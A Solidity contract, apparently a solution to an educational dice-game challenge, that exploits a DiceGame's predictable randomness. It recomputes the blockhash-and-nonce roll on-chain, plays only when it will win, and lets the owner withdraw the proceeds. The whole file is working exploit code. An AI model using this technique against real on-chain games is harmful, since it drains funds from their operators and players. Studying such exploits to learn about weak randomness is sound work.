pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    /// @notice Predicts the roll and only plays when it will win
    function riggedRoll() external {
        require(address(this).balance >= 0.002 ether, "Not enough ETH");

        // Read DiceGame state
        uint256 nonce = diceGame.nonce();

        // Replicate DiceGame randomness
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(
            abi.encodePacked(prevHash, address(diceGame), nonce)
        );
        uint256 roll = uint256(hash) % 16;

        console.log("Predicted roll:", roll);

        // Only roll if guaranteed win
        if (roll <= 5) {
            diceGame.rollTheDice{ value: 0.002 ether }();
        }
    }

    /// @notice Withdraw ETH from the contract
    function withdraw(address payable _to, uint256 _amount) external onlyOwner {
        require(address(this).balance >= _amount, "Insufficient balance");
        (bool sent, ) = _to.call{ value: _amount }("");
        require(sent, "Withdraw failed");
    }

    /// @notice Allow contract to receive ETH
    receive() external payable {}
}
